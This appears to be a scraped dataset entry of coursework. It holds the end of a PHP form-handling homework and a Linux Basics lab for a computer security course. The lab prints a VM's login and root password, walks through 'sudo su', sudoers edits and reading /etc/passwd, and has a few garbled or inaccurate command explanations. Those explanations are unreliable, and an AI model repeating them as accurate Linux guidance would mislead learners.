⦁        Four different inputs in order with HTML text indicating what type of input is requested aligned to the left side of the page: (a) a one-line text box; (b) a drop-down list with at least three options, and a default value; (c) a one-line text box for some numeric input (this input will be validated later); and (d) either two radio buttons or two checkboxes with no default. You have some flexibility here in the actual data that you collect.
⦁        An image aligned to the center of the right side of the page, across the page from the four inputs (note positioning in the diagram).
⦁        A reset button to clear the form data and a submit button to send the form data to the PHP page.
You will need to give name and possibly value attributes to the form controls so that they will be sent to the server as query parameters. 
⦁        Displaying Input Data
Your PHP page, called <EUID>.php will handle the submitted form data, where <EUID> should be replaced with your actual EUID. Your <EUID>.html page should POST to <EUID>.php (i.e., send form data to <EUID>.php). The <EUID>.php page will receive the parameters from <EUID>.html and will out put an HTML confirmation page that indicates the user’s information has been recorded plus outputs the actual data that was submitted.
⦁        Save the Form Data
Now, modify your <EUID>.php page to save the submitted data to the file <EUID>.txt, where <EUID> should be replaced with your actual EUID. If the <EUID>.txt file already exists, this data should be appended to the file. Additionally, modify your PHP page to output the historical data to your page, showing the complete contents of the file to the user on the <EUID>.php page. You should also place the file contents in an HTML <pre> tag to preserve the whitespace.
⦁        Basic Data Validation
Update your <EUID>.php page to verify that the user did not leave any fields blank when submitting the form. You can check whether a particular parameter has been passed using the PHP function isset(). However, isset($_POST[""name""]) will only check if the $_POST associative array has name as one of its keys. It does not check to see if the value of $_POST[""name""] is a non-empty value. If the user has not filled in every field, you will show an error message on the <EUID>.php page like the one below instead of displaying their submitted data:
 
The ""Error"" should be a large heading and the text should be in paragraph form. The ""Try again?” should link back to your <EUID>.html page so that the user can try again to enter the data. In error cases, no data should be written to the <EUID>.txt file.
REQUIREMENTS:
⦁        You are to write the HTML and PHP code solely on your own, without the aid of web page development software (e.g., WordPress, Drupal, etc.) on our Linux CSE servers (e.g., cse01, cse02, …, cse06) or Internet solutions. Points may be deducted for submissions found to contain HTML or PHP code automatically generated or from other sources. Additionally, no CSS may be included with student’s submission.
⦁        You will have to install phpMyAdmin on the Linux CSE server following the first three steps in the ""Installing phpMyAdmin.pdf"" file on Canvas for this activity.
⦁        Your HTML and PHP code should be well documented in terms of comments. For example, good comments in general consist of a header (with your name, course section, date, and brief description), comments for each variable, and commented blocks of code.
⦁        Your scripts will be graded based largely on whether it works correctly on the CSE machines, so you should make sure that your scripts do not have any runtime errors and runs on a CSE machine.
⦁        If you have any questions about what is expected, please contact your instructor or TA assigned to this course to ensure you understand these directions.
⦁        This is an individual programming assignment that must be the sole work of the individual student. Any instance of academic dishonesty will result in a grade of “F” for the course, along with a report filed into the Academic Integrity Database.
SUBMISSION:
⦁        You will electronically submit your files in a ZIP folder to the Homework 2 dropbox in Canvas by the due date and time. Please also include the URL and any instructions in a README file to Canvas."
"['file', 'type', 'files', 'directory', 'command', 'user', 'ova file', 'linux', 'file system', 'file type', 'commands', 'home directory', 'print', 'determine file type', 'file determine file', 'home', 'shell', 'command mode', 'system', 'terminal', 'file permissions', 'users', 'search file', 'open', 'linux file compression']",The University of North Texas,INTRO TO COMPUTER SECURITY,3550,Linux Basics,Lab,"Lab 2a: Linux Basics Lab
This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas.

⦁        Section 1: Overview of Linux
⦁        A typical Linux operating system is made up of three parts: the kernel, the shell and 
the applications.
⦁        Kernel: The kernel of Linux is the hub of the operating system: it allocates time and memory to programs and handles the file storage as well as response to system calls.
⦁        Shell: The shell acts as an interface between the user and the kernel. When a user logs in (into command line only environment), the login program checks the username and password, and then starts another program called the shell. The shell is a command line interpreter (CLI). It interprets the commands, which are typed by the user, and it arranges for them to be carried out. The commands are themselves programs: when they terminate, the shell gives the user another prompt. A graphical user interface for the shell is called Terminal.
⦁        Desktop Environment: Linux operating systems also have a graphical user interface (GUI) through which users can access applications and system resources. Unlike other operating systems Linux OS has many Desktop Environments available. Users are free to install the GUI of their choice. Some popular ones are GNOME, KDE, XFCE, Ubuntu Unity, etc. When one installs a Linux system, it comes with a default GUI. One can install other GUIs at any time, but only one GUI environment can be used at a time. For example, Kali Linux comes with GNOME.
⦁        Linux Directory Structure: In Linux, files and directories (folders) are laid out on disk in hierarchical fashion in a tree structure. The top directory is called root folder, it is denoted by  “/”  (slash). A collection of all files and directories in a Linux machine is referred to as a “filesystem”.
⦁        A path (location) of a file or directory in the filesystem is written starting from the root directory (/) followed by all intermediate directory names, which are separated by a slash with the actual file name (or directory name) in the end of the path. Example: the file path of the file “report.doc” in the above figure is written as “/home/its/ug1/ee51vn/report.doc”.
⦁        
 
Notes: 
⦁        In the path /home/its/ug1/ee51vn/report.doc, do not get confused between first slash / which denotes the root directory and subsequent slashes, which are used to separate directories at each level of the path. 
⦁        There are no spaces in a file path. Example: The file path /home/its/ug1/ee51vn/report.doc is the one single string with no spaces between slashes and subsequent folder names.

Q1: Write the path for directory staff  in the above figure.
Different default directories under the / directory are used for some specific purposes.
/bin : All executable binary files (including commands) are present in this directory.
/dev : Contains device files for hardware devices (usb, cdrom etc.)
/etc : Contains application’s configuration files, startup, shutdown, start, stop script for every individual program. 
/home : Home directory of the users. Every time a new user is created, a directory with the corresponding username is created within /home which contains other directories such as Desktop, Downloads, Documents, etc. 
/lib : Contains the kernel modules and shared library images required to boot the system and run commands in the root file system. 
/lost+found : This directory is created during installation of Linux, useful for recovering files which may be broken due to unexpected shutdown. 
/media : Temporary mount directory is created for removable devices viz., media/cdrom. 
/mnt : Temporary mount directory for mounting file system. 
/opt : Contains the third-party application software viz. Java, etc. 
/proc : A virtual and pseudo filesystem which contains information about running processes with a particular process id abbreviated as “pid”.

⦁        Section 2: Introduction to Ubuntu Linux
There exist many Linux OS distributions (around 3500 are known), but most of them are created from the same Linux kernel. We will use Ubuntu and Kali Linux for most of the labs in this course. Kali is mainly used for computer security and digital forensics applications. Other popular Linux variants are Redhat, Debian, and CentOS.

An OVA file is an Open Virtualization Appliance that contains a compressed, “installable” version of a virtual machine. When you open an OVA file, it extracts the VM and imports it into whatever virtualization software you have installed on your computer. The instructions below explain how to install an OVA file in Oracle VirtualBox. Briefly, these steps are:
⦁        If it is not already on your computer, download and install VirtualBox – https:///www.virtualbox.org/wiki/Downloads. You can find instructions on how to do this at the Installing VirtualBox wiki page.
⦁        For Mac users, select “OS X hosts”. Run the file and follow the on-screen directions.
⦁        You can launch VirtualBox from the Applications and “Keep in dock” if desired.
⦁        Obtain the specified OVA file from Canvas. You should then be able to double-click the OVA file to open it in VirtualBox and then click Import to start importing the OVA file into your library. This process may take several minutes, depending on the size of your OVA file.
⦁        Once VirtualBox has completed importing the OVA file, you should be able to see the virtual machine in your list. Select Start (or double-click the VM object in the list) to launch the VM.

Use the Ubuntu 20.04 VM with the following credentials:
username: sec-lab
password: untccdc

Note: If the VM does not start, in VirtualBox window, select the Ubuntu 20.04 VM, then in the menu select Settings → Network; the value in the field Attached to should be set as NAT:

 

Then, press OK, and try again.

The default environment on Ubuntu OS (desktop version) is shown in the next figure. On the left, you find a menu bar: Firefox Browser, Home folder, Ubuntu Software, Help, and Show Applications.

Here are some basic operations:

⦁        To Open Terminal:  Click on Show Applications, then select Utilities and click in the “Terminal” icon.
⦁        To Open Web Browser: Click on the Firefox Web Browser.
⦁        To Open Text Editors: Click on Show Applications and then click the “Text Editor” icon.
⦁        To Open File System: Click on Home folder.

 





⦁        Open Terminal by clicking on Show Applications, then select Utilities, and click in the “Terminal” icon.
⦁        You will see a Terminal window like the following one:
 
 




The text sec-lab@unt-sec:~$ is the shell prompt. It means that a user sec-lab, is logged into a machine unt-sec. The symbol “$” indicates an ordinary (unprivileged) user. The superuser (root) would have a symbol “#” instead. For an ordinary user bob, the prompt looks as follows: bob@unt-sec:~$ . The ~ (tilde) symbol indicates that the user is currently in his home directory. For the “root” user the home directory is /root. For the user “sec-lab” the home directory would be /home/sec-lab. In later sections, we will explore the difference between a superuser (root) and an ordinary user.

Notes: 
⦁        To separate commands from normal text, we used double quotes but when you are typing commands in shell do it WITHOUT QUOTES. In every tutorial (online tutorials or textbooks) it is customary to use a certain text scheme to separate command from normal text. By the end of the lab, you will be able to differentiate between normal text and Linux commands.

⦁        The italic part in a command is a sample name – you will have to use an actual name according to your environment. For example, if you are requested to type “/home/username”, and your username is “bob”, you will need to type “/home/bob”.

⦁        All commands in Linux are case-sensitive, e.g., “pwd” and “Pwd” are not considered same.


IMPORTANT NOTE: In the rest of this lab, 
you will replace “EUID” with your EUID. 
Example: Let your EUID be “aa0001”; 
when instructed to type a command “adduser EUID”, 
you will type “adduser aa0001”, and when instructed 
to type a command “adduser EUIDnew”, 
you will type “adduser aa0001new”.

⦁        User Account Management
⦁        Create a new user account (for yourself):
⦁        Type “sudo su”. The system will ask for the root password. Type “untccdc” as the password. The shell prompt will change to # and you are working now as a user root. 
⦁        Type “adduser euid”.
⦁        Enter a password for your account. You have to do it twice.
Note: Passwords are not shown in terminal as you type them. Usually while typing password you’ll see *****(stars) or in ……… (dots). But here you don’t see anything on a Linux Terminal.
⦁        Add further user details. These details are optional-you can just hit enter to skip for Full Name, Number, Phone etc.) –See the below screenshot.
⦁        Type “y” at “Is this information correct?”

 


⦁        To change a user password, use passwd command.
Example: passwd euid
⦁        Add new user to sudoers file to give them superuser permissions.
⦁        Type “nano /etc/sudoers”. (Here, “nano” is a command-line text editor - details are provided in the Text Editors section of this manual.)
⦁        In this file, add the following line:
Username ALL=(ALL:ALL) ALL. Add this line next to the following one:
 root ALL=(ALL:ALL) ALL
You have to provide your newly created username.
⦁        Press Control+O, Press Enter, when asked for confirmation, Press Control+X to exit
⦁        Close the terminal window. 
⦁        Go to the upper menu and expand the dropdown, expand the Power Off/ Log Out menu and then select Power Off…
 

Then, in the dialog box, select the Restart button to restart.
Now select the newly created account and login. You may Skip and click on Next until you’re able to select Done to complete the setup of the new account.

Q2: Login to your new user account, open a terminal and type “sudo su”, enter sudo password for your account, and submit a screenshot. The screenshot should clearly show the prompt. It will look like “root@usudont-sec:/home/euid”.

⦁        Create another user from your account.
⦁        Open Terminal after logging into your account.
⦁        Type “sudo adduser euidnew”. Enter sudo password for your account.
Note: the user password is asked when you use the “sudo” command for first time in a terminal. “sudo” is used to elevate a normal user to root user for execution certain high privilege commands.
⦁        Add a (unix) password for new user euidnew twice and rest of the details as earlier. 
 


⦁        To change to root user from normal user (type “exit” if currently in root mode for user):
⦁        Type “sudo su –”.
⦁        If prompted, type the root user password at the prompt. After successful login, you should observe a change in shell prompt from your user to root user.
⦁        Type “exit” to exit from the root user. Now you should be back to you user prompt.
⦁        Type “tail /etc/passwd” (note that “/etc/passwd” is one string—no spaces in between).
Q3: Attach a screenshot of the result.

A root user (also referred to as a superuser) is an administrator of the system who has full privileges by default, while normal users have limited privileges. Normal users need to use the “sudo” command in order to temporarily gain certain high-privilege commands. Example of these commands are: software installation, changing to the root user in a terminal, changing the system settings, and others.
Some Basic Commands
Files and Directories
⦁         pwd – present working directory   
Type “pwd” at command prompt (without quotes). This command displays the directory in which you are currently. When a user starts a shell the default directory is user’s home directory: /home/euid.

⦁        cd – change directory
This command is used to change to a desired directory from current directory.
⦁        Type “cd /home” (without quotes). This will move the user to the /home directory.
⦁        Type “pwd”. What is it showing
⦁        Type “cd -”. This will take you back to previous directory, i.e., your home directory
⦁        You can use “cd ~” to go back to your home directory from. (~ Tilde symbol)
⦁        . (single dot) refers to current directory, ..(double dots) refer to parent directory.
“cd .” keeps you in same directory, while “cd ..” moves to parent directory, a level above. “cd ../..” moves you two levels above the current directory.
⦁        ls – list
ls command simply lists file and directories in present directories. Option “–l” which gives more details about files which include file size, time created, file permissions etc
⦁        Type “ls –l”
To display details of a directory or file: ls –l directory or file name. Ex: ls –l Desktop
⦁        Type “ls –la”

Q4: What output “ls –la” gives (take a screenshot)? 

Q5: What difference did you observe between the results of “ls –l” and “ls –la”? 
What does the option “-a” mean? 
Hint: Refer to the man page: man ls. Also, see the section on man help below.

⦁        mkdir - create a directory
⦁        Type “mkdir firstdir”. It creates a new directory called firstdir. You can also create multiple directories and also nested directories
⦁        Type “mkdir dir1 dir2 dir3.” It creates 3 directories in present directory.
⦁        Type “mkdir –p dir11/dir22/{dir33, dir44}”. 
It creates 4 directories: dir11, dir22 inside dir11, dir33 and dir44 inside dir22.
⦁        Type “ ls”

⦁        rm - delete a file or directory
⦁        type “rm –r dir3”. You can also use “rmdir” but it only deletes empty directories 

⦁        touch - create empty file(s)
⦁        Type “touch file1 file2 file3”. 
⦁        mv - move or rename files and directories
⦁        Type “mv file1 dir1” - this moves (cut and paste) the file file1 to the directory dir1.
⦁        Type “mv file2 file22”.
⦁        Type “ls”.
⦁        cp - copy files and directories
Type the following commands in the order shown below:
⦁        “touch file4”. Creates a file with the name file4.
⦁        “mkdir dir4” . Creates a directory dir4.
⦁        “cp file4 dir4”. Copies file4 to dir4.
⦁        “mkdir dir5”. Creates another directory dir5.
⦁        “cp -r dir4 dir5”. Copies dir4 to dir5.

Q6: Why do we have to use “-r” option to copy directories? (Hint: Use man cp.)

⦁        find - to find files and directories.
⦁        Type “find /root –name file1”.

Q7: What is the result? (Show the screenshot.)

You are searching for the file with name file1 in the directory /root. This command will search for the file in /root and in all its subdirectories. You gave /root as search location as you think file1 must be somewhere in it. If you have no information where the file might be in your system, you should start searching for it from the most top directory in the filesystem, that is “/”. In this later case, the command should be find / -name file1.

⦁        The absolute path of a file or directory is its path written from the root of the file system. For example, consider the directory dir44 you created earlier in Step 5. Its absolute path is /home/euid/dir11/dir22/dir44. 

⦁        The relative path of a file or directory is its path from the current directory. Now, you are in your home directory which is /home/euid. The relative path of dir44 from this directory is dir11/dir22/dir44. One writes the relative path starting from a directory one level below, i.e., dir11 in our case.

⦁        One can refer to a file or directory either using relative or absolute path (both are possible).
⦁        Type “touch /home/euid/dir11/dir22/dir44/file44”.
(Replace username you actual username).
⦁        Type “dir11dir22/dir44/file55”
Either way you are able can access dir44 

Note: When using the relative path, one should be aware of the current directory. In the above example, when the current directory changes to home, then the relative path to dir44 changes to euid/dir11/dir22/dir44.

File Compression and Archiving

⦁        To compress and archive files: In Linux file compression and archiving (grouping file together) and compression are two different activities. First, we archive multiple files with “tar” command. A file with “.tar” extension is created. Then we zip (compress the file) with gzip command. (gzip-stands for gunzip is compression tool in linux. Bunzip (bzip2) and zip are other commonly used compression tools)

⦁        Type “touch a b c d”. Creates 4 files a, b, c and d.
⦁        tar –cf compressed.tar a b c d. We are creating a tar file compressed.tar from the files a, b, c and d.
⦁        gzip –vf compressed.tar. This should create a file compressed.tar.gz.
Note:  For “tar” command, you should supply output filename along with .tar extension. For gzip, it automatically creates a zipped file with .gz extension. You no longer have .tar file after you compressed it with gzip.

⦁        You can also do it in single step which is usually the preferred way: 
type “tar –zcvf compressed2.tar.gz a b c d”. 

⦁        To extract and uncompress files:
⦁        Type “rm –rf a b c d”. Deleting the files.
⦁        Type “ls”.
⦁        Type “gzip –dvf compressed.tar.gz” – you will get the file compressed.tar.
⦁        Type “tar –xvf compessed.tar”. You will get the original files a, b, c and d.
⦁        Type “ls”.
⦁        As before, you can uncompress and extract the compressed2.tar.gz in a sigle step:
Type “tar –zxvf compressed2.tar.gz”.

Getting help with the man command

The “man” command is used to get help for any command in Linux. man stands for manual. To pull up a man page of a command, type man command.  Ex: man ls. This command displays list of options available with the command. Man pages explain different options and syntax of a command and are usually difficult to understand for beginners. If you want to know usage and example for a command, google is the best place to look. 

Type “q” to quit from man page.

⦁        Section 3: File Permissions and Access Control

In Linux a file has read, write and execute permissions. And permissions are assigned to users of three categories: owner, group and others. The user who creates a file will be the owner, group is group of users who has access. Others are all the users other than owner and users in the group.


⦁        Understanding file/directory permissions:
Type ls –l filename to list the file permissions.
The below figure explains the file details displayed.

 

Each file (and directory) has associated access rights, which may be found by typing ls -l. Also, ls -lg gives additional information as to which group owns the file (beng95 in the following example): 
-rwxrw-r-- 1 ee51ab beng95 2450 Sept29 11:52 file1
In the left-hand column is a 10 symbol string consisting of the symbols d, r, w, x, -, and, occasionally, s or S. If d is present, it will be at the left hand end of the string, and indicates a directory: otherwise - will be the starting symbol of the string. 
The 9 remaining symbols indicate the permissions, or access rights, and are taken as 3 groups of 3. 
⦁        The left group of 3 gives the file permissions for the user that owns the file (or directory) (ee51ab in the above example); 
⦁        the middle group gives the permissions for the group of people to whom the file (or directory) belongs (eebeng95 in the above example); For every user in Linux, a group with the same name is also created. This group will be default group on newly created files. 
⦁        the rightmost group gives the permissions for all others.
The symbols r, w, etc., have slightly different meanings depending on whether they refer to a simple file or to a directory. 

⦁        Access rights on files.
⦁        r (or -), indicates read permission (or otherwise), that is, the presence or absence of permission to read and copy the file 
⦁        w (or -), indicates write permission (or otherwise), that is, the permission (or otherwise) to change a file 
⦁        x (or -), indicates execution permission (or otherwise), that is, the permission to execute a file, where appropriate 


⦁        Access rights on directories.
⦁        r allows users to list files in the directory; 
⦁        w means that users may delete files from the directory or move files into it; 
⦁        x means the right to access files in the directory. This implies that you may read files in the directory provided you have read permission on the individual files. 
⦁        So, in order to read a file, you must have executed permission on the directory containing that file, and hence on any directory containing that directory as a subdirectory, and so on, up the tree. 

Some Examples:
-rwxrwxrwx        a file that everyone can read, write and execute (and delete).
-rw-------        a file that only the owner can read and write - no-one else can read or write and no-one has execution rights (e.g., your mailbox file).

⦁        Changing access rights (i.e., permissions) on a file
⦁        chmod (changing a file mode):
⦁        Only the owner of a file can use chmod to change the permissions of a file. The options of chmod are as follows 
Symbol        Meaning
u        user
g        group
o        other
a        all
r        read
w        write (and delete)
x        execute (and access directory) 
+        add permission
-        take away permission

⦁        type “touch access” (to create a file called access).
⦁        type “ls –l access”.
⦁        To remove read write and execute permissions on the file access for the group and others type  “sudo chmod go-rwx access”. This will leave the other permissions unaffected. 
⦁        To give read and write permissions on the file access to all, 
type “sudo chmod a+rw access”.
⦁        chgrp-this command is used to change the group of a file
⦁        Type “sudo chgrp euidnew access”. This will change the default group on file “access” to euidnew from your current username. 
⦁        Type “ls –l access”.

⦁        chown- this command is used change ownership of a file or directory. This can also be used to change the group like chgrp.
⦁        Type “touch own_file”.
⦁        Type “ls –l own_file”.
⦁        Type “sudo chown euidnew own_file”. This change owner of the file to euidnew from you.
⦁        Type “mkdir own_dir”.
⦁        Type “ls –ld own_dir”. The –ld option displays properties of directory. If you only use –l it shows properties of contents of own_dir.
⦁        Type “sudo chown euidnew:euidnew own_dir”. This changes both the owner and the group to euidnew on folder own_dir. 
⦁        Type “ls –ld own_dir”.

Q8: Submit a screenshot of the terminal.

Note: The command  chown only changes the owner of a directory but not its contents. To change ownership of files and directories within a directory own_dir, along with is permissions use chown with “–R” option. 
Example: “sudo chown –R euidnew: euidnew own_dir”.


⦁        Section 4: Installing Software
⦁        To install a software package apt-get command is used in Ubuntu Linux.
⦁        Type “sudo apt-get update”
⦁        Type “sudo apt-get install chromium”
(if this does not work, use “sudo apt-get install chromium-browser”.)
It checks for file size to be downloaded and ask for confirmation. Type “y” and hit enter. 
This command installs Chromium web browser.

Q9: Take a screenshot of the notification that installation is complete.
Note: If you do not know the exact name of the package, you can search for it with “apt-cache” command. Example: apt-cache search openoffice. Relevant packages will be shown.

⦁        Installing software from GUI: One can also install software using “Add or Remove” utility. 
Click Applications → System Tools → Add or Remove Software.

⦁        To download a file from the Internet, use wget command.
Type 
wget https://kekeseen.files.wordpress.com/2013/03/linux_commands_08.pdf

This will download the pdf file. Note that the wget utility works any file type.
⦁        Section 5: Text Editors (Nano and Vim)
Nano:
⦁        To open a file in nano: Type “nano newfile”. This will open a blank file called newfile.
 If there is already a file by name newfile nano will open that. Only if there exists no file by the name supplied it opens a new blank file with the supplied name.
⦁        To edit and save: To write data to file, move cursor with arrow keys to location where you want to add content and start writing. Delete content using backspace.
Press Ctrl+O, it ask for confirmation: File name to write: newfile. Hit Enter.
⦁        To exit nano: Press Ctrl+X.
⦁        To search for a string or keyword: Press Ctrl+W. A search: prompt appears at the bottom, type keyword you want to search and press enter.
Note: You have all the above explained controls at the bottom of the nano editor with brief description.

 
Vim:
VIM Editor has 2 different modes: Command Mode and Insert Mode.
⦁        Command mode: Type: “vim blankfile”. This opens a new file-blank file if a file doesn’t exist by the name. A file is opened into command mode by default. In this mode you can issue commands to edit text. 

⦁        Insert mode:
Hit letter “i”, which moves to insert mode from command mode. You can edit, add content to the file in this mode. Use arrow keys to navigate, backspace to delete.
To save changes to the file: 
⦁        Press Escape key-it takes file back to command mode.
⦁        Press ""Shift + :” A : prompt is created at bottom of file.
⦁        Type letter “w”-it saves your file
Note: If you don’t want save the file at this point but want to go back, hit escape-to go to command mode and then “i” to go to insert mode. You always have to be in command mode before you go to insert mode.
⦁        Again Press ""Shift + :”- and type “q” to exit vi editor. If file has unsaved modifications, vim asks for confirmation. Typing q! Forcefully quits without saving.

⦁        More about command mode: This mode takes commands from key board, to do operation like copy, paste, cut delete, etc. You can navigate using arrow keys.
⦁        dd - delete current line (in which cursor is present). ndd –deletes n number of lines. Example: 5dd.
⦁        yy - copy current line (in which cursor is present). nyy- copies n number of lines.
⦁        p - paste copied line(s) below current line.

⦁        To print content of text file to terminal
⦁        Type “cat newfile”. It will dump all the content in newfile to terminal.
⦁        Type “less newfile”. This will open newfile on terminal but only partially display its content. Press enter to browse the file one line at a time. Press Q to exit less.

There exist many other text editors such as emacs, pico, and others, however we limit our demonstration to nano and vim. The main reasons are that they are simple, and that they are likely to be present (built-in) in various current and future Linux/Unix distributions. Typically, these operating systems have GUI-based text editors available as well.

⦁        Appendix: List of Useful Commands
⦁        Note: The below list is not exhaustive: it is composed to cover some of the commands, which will be commonly used in our labs. The students are recommended to use the command “man” in order to see a complete list of available options.
⦁         
⦁        a
⦁          ⦁        alias             Create an alias of a command 
⦁          apropos  Search Help manual pages (man -k)
⦁          ⦁        apt-get   Search for and install software packages (Debian/Ubuntu for Centos use yum)
⦁          ⦁        aptitude Search for and install software packages (Debian/Ubuntu)
⦁          ⦁        aspell     Spell Checker
⦁          ⦁        awk        Find and Replace text, database sort/validate/index
⦁        b
⦁          ⦁        basename Strip directory and suffix from filenames
⦁          bash    GNU Bourne-Again SHell 
⦁          ⦁        bc        Arbitrary precision calculator language 
⦁          ⦁        bg        Send to background
⦁          ⦁        break   Exit from a loop •
⦁          ⦁        builtin  Run a shell builtin
⦁          ⦁        bzip2   Compress or decompress named file(s)
⦁        c
⦁          ⦁        cal      Display a calendar
⦁          ⦁        case    Conditionally perform a command
⦁          ⦁        cat      Concatenate and print (display) the content of files
⦁          ⦁        cd       Change Directory
⦁          ⦁        cfdisk  Partition table manipulator for Linux
⦁          ⦁        chgrp   Change group ownership
⦁          ⦁        chmod  Change access permissions
⦁          ⦁        chown   Change file owner and group
⦁          ⦁        chroot   Run a command with a different root directory
⦁          ⦁        chkconfig System services (runlevel)
⦁          ⦁        cksum   Print CRC checksum and byte counts
⦁          clear     Clear terminal screen
⦁          ⦁        cmp      Compare two files
⦁          ⦁        comm   Compare two sorted files line by line
⦁          ⦁        command  Run a command - ignoring shell functions •
⦁          ⦁        continue Resume the next iteration of a loop •
⦁          ⦁        cp         Copy one or more files to another location
⦁          ⦁        cron     Daemon to execute scheduled commands
⦁          ⦁        crontab Schedule a command to run at a later time
⦁          ⦁        csplit   Split a file into context-determined pieces
⦁          ⦁        cut       Divide a file into several parts
⦁        d
⦁          ⦁        date     Display or change the date & time
⦁          ⦁        dc        Desk Calculator
⦁          ⦁        dd       Convert and copy a file, write disk headers, boot records
⦁          ⦁        ddrescue Data recovery tool
⦁          ⦁        declare  Declare variables and give them attributes •
⦁          ⦁        df        Display free disk space
⦁          ⦁        diff     Display the differences between two files
⦁          ⦁        diff3    Show differences among three files
⦁          ⦁        dig      DNS lookup
⦁          ⦁        dir      Briefly list directory contents
⦁          ⦁        dircolors Colour setup for `ls'
⦁          ⦁        dirname  Convert a full pathname to just a path
⦁          ⦁        dirs     Display list of remembered directories
⦁          ⦁        dmesg Print kernel & driver messages 
⦁          ⦁        du       Estimate file space usage
⦁        e
⦁          ⦁        echo    Display message on screen •
⦁          ⦁        egrep   Search file(s) for lines that match an extended expression
⦁          ⦁        eject     Eject removable media
⦁          ⦁        enable  Enable and disable builtin shell commands •
⦁          ⦁        env      Environment variables
⦁          ethtool  Ethernet card settings
⦁          ⦁        eval     Evaluate several commands/arguments
⦁          ⦁        exec    Execute a command
⦁          ⦁        exit     Exit the shell
⦁          ⦁        expect Automate arbitrary applications accessed over a terminal
⦁          ⦁        expand Convert tabs to spaces
⦁          ⦁        export  Set an environment variable
⦁          ⦁        expr     Evaluate expressions
⦁        f
⦁          ⦁        false    Do nothing, unsuccessfully
⦁          ⦁        fdformat Low-level format a floppy disk
⦁          ⦁        fdisk   Partition table manipulator for Linux
⦁          ⦁        fg        Send job to foreground 
⦁          ⦁        fgrep   Search file(s) for lines that match a fixed string
⦁          ⦁        file      Determine file type
⦁          ⦁        find     Search for files that meet a desired criteria
⦁          ⦁        fmt      Reformat paragraph text
⦁          ⦁        fold     Wrap text to fit a specified width.
⦁          ⦁        for       Expand words, and execute commands
⦁          format Format disks or tapes
⦁          free     Display memory usage
⦁          ⦁        fsck     File system consistency check and repair
⦁          ftp       File Transfer Protocol
⦁          ⦁        function Define Function Macros
⦁          ⦁        fuser    Identify/kill the process that is accessing a file
⦁        g
⦁          ⦁        gawk     Find and Replace text within file(s)
⦁          ⦁        getopts  Parse positional parameters
⦁          ⦁        grep      Search file(s) for lines that match a given pattern
⦁          ⦁        groupadd Add a user security group
⦁          ⦁        groupdel  Delete a group
⦁          ⦁        groupmod Modify a group
⦁          ⦁        groups   Print group names a user is in
⦁          ⦁        gzip       Compress or decompress named file(s)
⦁        h
⦁          ⦁        hash     Remember the full pathname of a name argument
⦁          ⦁        head     Output the first part of file(s)
⦁          help      Display help for a built-in command •
⦁          ⦁        history  Command History
⦁          hostname Print or set system name
⦁        i
⦁          ⦁        iconv Convert the character set of a file
⦁          ⦁        id       Print user and group id's
⦁          ⦁        if       Conditionally perform a command
⦁          ⦁        ifconfig Configure a network interface
⦁          ⦁        ifdown Stop a network interface 
⦁          ⦁        ifup      Start a network interface up
⦁          ⦁        import  Capture an X server screen and save the image to file
⦁          ⦁        install  Copy files and set attributes
⦁        j
⦁          ⦁        jobs     List active jobs •
⦁          ⦁        join     Join lines on a common field
⦁        k
⦁          ⦁        kill     Stop a process from running
⦁          ⦁        killall Kill processes by name
⦁        l
⦁          ⦁        less    Display output one screen at a time
⦁          ⦁        let      Perform arithmetic on shell variables •
⦁          ⦁        link    Create a link to a file 
⦁          ⦁        ln       Create a symbolic link to a file
⦁          ⦁        local  Create variables •
⦁          ⦁        locate Find files
⦁          ⦁        logname  Print current login name
⦁          ⦁        logout  Exit a login shell •
⦁          ⦁        look     Display lines beginning with a given string
⦁          ⦁        lpc       Line printer control program
⦁          ⦁        lpr       Off line print
⦁          lprint   Print a file
⦁          lprintd Abort a print job
⦁          lprintq List the print queue
⦁          ⦁        lprm    Remove jobs from the print queue
⦁          ⦁        ls         List information about file(s)
⦁          ⦁        lsof     List open files
⦁        m
⦁          make    Recompile a group of programs
⦁          ⦁        man      Help manual
⦁          ⦁        mkdir   Create new folder(s)
⦁          ⦁        mkfifo  Make FIFOs (named pipes)
⦁          mkisofs  Create an hybrid ISO9660/JOLIET/HFS filesystem
⦁          ⦁        mknod  Make block or character special files
⦁          ⦁        more     Display output one screen at a time
⦁          ⦁        mount   Mount a file system
⦁          ⦁        mtools  Manipulate MS-DOS files
⦁          ⦁        mtr      Network diagnostics (traceroute/ping)
⦁          ⦁        mv      Move or rename files or directories
⦁          ⦁        mmv   Mass Move and rename (files)
⦁        n
⦁          netstat  Networking information
⦁          ⦁        nice      Set the priority of a command or job
⦁          ⦁        nl          Number lines and write files
⦁          ⦁        nohup   Run a command immune to hangups
⦁          ⦁        notify-send  Send desktop notifications
⦁          ⦁        nslookup Query Internet name servers interactively
⦁        o
⦁          ⦁        open   Open a file in its default application
⦁          ⦁        op       Operator access 
⦁        p
⦁          ⦁        passwd   Modify a user password
⦁          ⦁        paste    Merge lines of files
⦁          pathchk  Check file name portability
⦁          ⦁        ping     Test a network connection
⦁          ⦁        pkill     Stop processes from running
⦁          ⦁        popd    Restore the previous value of the current directory
⦁          ⦁        pr        Prepare files for printing
⦁          printcap Printer capability database
⦁          printenv Print environment variables
⦁          ⦁        printf   Format and print data •
⦁          ⦁        ps        Process status
⦁          ⦁        pushd  Save and then change the current directory
⦁          ⦁        pv        Monitor the progress of data through a pipe 
⦁          ⦁        pwd     Print Working Directory
⦁        q
⦁          ⦁        quota    Display disk usage and limits
⦁          ⦁        quotacheck Scan a file system for disk usage
⦁          ⦁        quotactl Set disk quotas
⦁        r
⦁          ⦁        ram      ram disk device
⦁          ⦁        rcp       Copy files between two machines
⦁          ⦁        read     Read a line from standard input •
⦁          readarray Read from stdin into an array variable •
⦁          ⦁        readonly Mark variables/functions as readonly
⦁          reboot   Reboot the system
⦁          ⦁        rename Rename files
⦁          renice   Alter priority of running processes 
⦁          remsync Synchronize remote files via email
⦁          ⦁        return  Exit a shell function
⦁          ⦁        rev       Reverse lines of a file
⦁          ⦁        rm       Remove files
⦁          ⦁        rmdir    Remove folder(s)
⦁          ⦁        rsync    Remote file copy (Synchronize file trees)
⦁        s
⦁          ⦁        screen   Multiplex terminal, run remote shells via ssh
⦁          ⦁        scp     Secure copy (remote file copy)
⦁          ⦁        sdiff   Merge two files interactively
⦁          ⦁        sed     Stream Editor
⦁          ⦁        select Accept keyboard input
⦁          ⦁        seq     Print numeric sequences
⦁          ⦁        set      Manipulate shell variables and functions
⦁          sftp    Secure File Transfer Program
⦁          ⦁        shift   Shift positional parameters
⦁          ⦁        shopt Shell Options
⦁          ⦁        shutdown Shutdown or restart linux
